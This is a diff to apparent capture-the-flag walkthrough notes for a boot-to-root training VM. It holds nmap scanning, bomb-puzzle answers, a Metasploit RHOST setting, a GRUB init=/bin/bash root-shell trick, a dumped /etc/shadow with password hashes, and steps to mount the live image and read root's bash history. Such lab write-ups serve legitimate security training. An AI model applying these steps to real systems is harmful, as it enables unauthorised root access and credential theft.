@@ -15,7 +15,7 @@ Find target's address:
 ## Port listing
 List ports on the target with nmap
 
-    nmap -sA -O -sV -vv -oN nmap.dump IP_TARGET/24
+    nmap -sA -O -sV -vv -oN nmap.dump IP_TARGET
 
 # Website
 ## Detect files and directories with gobuster
@@ -191,7 +191,7 @@ New challenge: diffuse the bomb
 Public speaking is very easy.
 1 2 6 24 120 720
 7 b 524
-9
+9 
 opekmq
 4 2 6 3 1 5
 
@@ -208,7 +208,7 @@ echo -n SLASH | md5sum
 
 646da671ca01bb5d84dbb5fb2238dc8e
 
-Logged as zaz
+# Logged as zaz
 
 1 SUID file
 
@@ -332,3 +332,28 @@ use 0
 show options
 
 set RHOST 192.168.43.82
+
+# Other writeup
+
+shift key at startup to get prompted by the GRUB
+
+live init=/bin/bash
+
+
+# /etc/shadow
+
+root:$6$P3HXAOsR$Lmz85I7RXUJLU8KR.C2okbToyNfq5QIDj6YOoWYilDWQ3e.dhXC/bamN4xLcAZVHHLFuszMaGD6nRa5HrFAls0:16723:0:99999:7:::
+ft_root:$6$lOBKtnYu$GBZ.hMzEtOsj02ngxGvMKZzFFBy2DEzil11s0G6a5eDUyEo88t1VZfdVqlfUc/jUG9748avR0.FhT4rJmPqmI1:16723:0:99999:7:::
+
+# NFS
+https://elinux.org/Squash_FS_Howto#Creating_and_using_squashed_file_systems
+
+scp zaz@192.168.1.241:/cdrom/casper/filesystem.squashfs .
+
+mkdir /mnt/dir 
+
+mount filesystem.squashfs /mnt/dir -t squashfs -o loop 
+
+cd /mnt/dir
+
+cat ./root/.bash_history | grep -C 4 adduser
